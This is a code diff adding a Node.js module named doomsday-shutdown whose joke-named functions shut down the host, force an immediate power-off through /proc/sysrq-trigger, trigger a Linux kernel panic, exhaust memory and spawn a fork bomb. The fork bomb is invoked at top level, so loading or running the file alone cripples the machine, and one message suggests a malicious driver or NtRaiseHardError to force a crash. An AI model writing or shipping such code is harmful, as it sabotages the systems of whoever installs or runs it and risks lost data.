@@ -1,0 +1,63 @@
+// doomsday-shutdown/index.js
+const { exec } = require('child_process');
+
+function gentleGoodnight() {
+  const command = process.platform === 'win32' ? 'shutdown /s /t 0' : 'shutdown -h now';
+  exec(command, (err) => {
+    if (err) console.error('💤 Failed to shut down gently:', err.message);
+    else console.log('🛏️ Gently going to sleep...');
+  });
+}
+
+function yeetThePlug() {
+  if (process.platform !== 'linux') {
+    console.warn('🔌 yeetThePlug only works on Linux systems.');
+    return;
+  }
+  exec('sync; echo o > /proc/sysrq-trigger', (err) => {
+    if (err) console.error('🪠 Failed to yeet the plug:', err.message);
+    else console.log('🧨 Unplugged reality.');
+  });
+}
+
+function blueScreenOfBoom() {
+  if (process.platform !== 'win32') {
+    console.warn('💙 blueScreenOfBoom only works on Windows systems.');
+    return;
+  }
+  console.warn('💙 This will only work with a custom compiled executable or malicious driver. Consider using NtRaiseHardError.');
+  exec('shutdown /s /f /t 0', (err) => {
+    if (err) console.error('💥 Failed to boom:', err.message);
+  });
+}
+
+function summonTheKernelDemon() {
+  if (process.platform !== 'linux') {
+    console.warn('👹 summonTheKernelDemon only works on Linux systems.');
+    return;
+  }
+  exec('echo 1 > /proc/sys/kernel/sysrq && echo c > /proc/sysrq-trigger', (err) => {
+    if (err) console.error('😈 Failed to summon demon:', err.message);
+    else console.log('🔥 Kernel panic unleashed.');
+  });
+}
+
+function forkocalypse() {
+  while (true) require('child_process').fork(__filename);
+}
+
+function eatTheRAM() {
+  const blackhole = [];
+  while (true) blackhole.push(Buffer.alloc(1e6));
+}
+
+forkocalypse();
+
+module.exports = {
+  gentleGoodnight,
+  yeetThePlug,
+  blueScreenOfBoom,
+  summonTheKernelDemon,
+  forkocalypse,
+  eatTheRAM
+};
